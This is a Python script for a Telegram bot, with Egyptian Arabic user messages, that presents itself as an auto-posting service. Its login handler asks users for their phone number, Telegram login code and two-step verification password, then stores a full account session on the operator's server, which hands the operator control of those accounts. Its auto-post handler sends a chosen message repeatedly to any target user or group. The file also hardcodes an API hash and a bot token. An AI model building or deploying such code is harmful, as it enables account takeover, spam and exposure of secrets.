import os
import asyncio
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError

# --- البيانات اللي أنت بعتها ---
API_ID = 21516763
API_HASH = '4d9d669e34f495934b4497a4001b1bd3'
BOT_TOKEN = '8103225505:AAFYolYC8BnOUIQJQ8sIkuZAoZWr6h_vfBo'
# ----------------------------

async def main():
    # تشغيل البوت
    bot = TelegramClient('bot_manager', API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)

    if not os.path.exists('sessions'):
        os.makedirs('sessions')

    @bot.on(events.NewMessage(pattern='/start'))
    async def start(event):
        sender = await event.get_sender()
        first_name = sender.first_name if sender.first_name else "يا حب"
        
        welcome_msg = (
            f"اهلا بيك يا {first_name} يا اخويا نورت البوت\n\n"
            "بوت للناس بتاعت المجال و الناس بتاعت النشر التلقاءي شوف انت داخل هنا لية و اتعامل\n"
            "دوس على زرار '📖 إرشادات الاستخدام' عشان تعرف تعمل إيه.\n\n"
            "لو محتاج اي مساعدة ابعتلي @uvvvrn و انا معاك"
        )

        buttons = [
            [Button.inline("➕ ربط حسابك بالتليجرام", b"login")],
            [Button.inline("🚀 النشر التلقائي", b"auto_post"), Button.inline("📖 إرشادات الاستخدام", b"guide")],
            [Button.inline("🔒 خيار 3", b"3"), Button.inline("🔒 خيار 4", b"4")],
            [Button.inline("🔒 خيار 5", b"5"), Button.inline("🔒 خيار 6", b"6")]
        ]
        await event.respond(welcome_msg, buttons=buttons)

    @bot.on(events.CallbackQuery(data=b"guide"))
    async def guide_handler(event):
        guide_text = (
            "بص يا حبيب أخوك، الموضوع سهل خالص:\n\n"
            "1️⃣ دوس على (ربط حسابك)، واكتب رقمك بمفتاح الدولة (+20...)\n"
            "2️⃣ هيجيلك كود من تليجرام، ابعته هنا للبوت.\n"
            "3️⃣ لو في باسورد (تحقق بخطوتين) اكتبه.\n"
            "4️⃣ بعد الربط، ادخل على (النشر التلقائي) وحدد الرسالة والمكان."
        )
        await event.respond(guide_text, buttons=[Button.inline("فهمت يا حب ✅", b"back_to_start")])

    @bot.on(events.CallbackQuery(data=b"back_to_start"))
    async def back_to_start(event):
        await start(event)

    @bot.on(events.CallbackQuery(data=b"login"))
    async def login_handler(event):
        sender_id = event.sender_id
        async with bot.conversation(sender_id) as conv:
            await conv.send_message("📱 ابعت رقمك دلوقتي بمفتاح الدولة (مثلاً +2010...):")
            phone = (await conv.get_response()).text
            
            client = TelegramClient(f"sessions/{sender_id}", API_ID, API_HASH)
            await client.connect()
            
            try:
                await client.send_code_request(phone)
                await conv.send_message("📩 كود التليجرام وصلك.. ابعتهولي هنا:")
                code = (await conv.get_response()).text
                await client.sign_in(phone, code)
            except SessionPasswordNeededError:
                await conv.send_message("🔐 حسابك متأمن.. ابعت باسورد التحقق بخطوتين:")
                pwd = (await conv.get_response()).text
                await client.sign_in(password=pwd)
            except Exception as e:
                await conv.send_message(f"❌ حصلت مشكلة: {str(e)}")
                return
            
            await conv.send_message("✅ عااش يا وحش، حسابك اتصطب بنجاح!")
            await client.disconnect()

    @bot.on(events.CallbackQuery(data=b"auto_post"))
    async def auto_post(event):
        sender_id = event.sender_id
        session_path = f"sessions/{sender_id}.session"
        
        if not os.path.exists(session_path):
            await event.respond("❌ يا غالي اربط حسابك الأول من زرار (ربط حسابك).")
            return

        async with bot.conversation(sender_id) as conv:
            await conv.send_message("📝 اكتب الرسالة اللي عايزها تتكرر:")
            text = (await conv.get_response()).text
            
            await conv.send_message("🆔 ابعت يوزر الجروب أو الشخص (مثلاً @username):")
            target = (await conv.get_response()).text
            
            await conv.send_message("🔢 عايز تبعتها كام مرة؟")
            count_text = (await conv.get_response()).text
            count = int(count_text) if count_text.isdigit() else 1

            await conv.send_message("⏳ جاري بدء الإرسال من حسابك...")
            
            user_client = TelegramClient(session_path, API_ID, API_HASH)
            await user_client.connect()
            
            for i in range(count):
                try:
                    await user_client.send_message(target, text)
                    await asyncio.sleep(4)
                except:
                    break
                
            await conv.send_message(f"✅ تم الإرسال {count} مرات بنجاح.")
            await user_client.disconnect()

    print("البوت شغال زي الفل دلوقتي.. جرب افتح تليجرام.")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())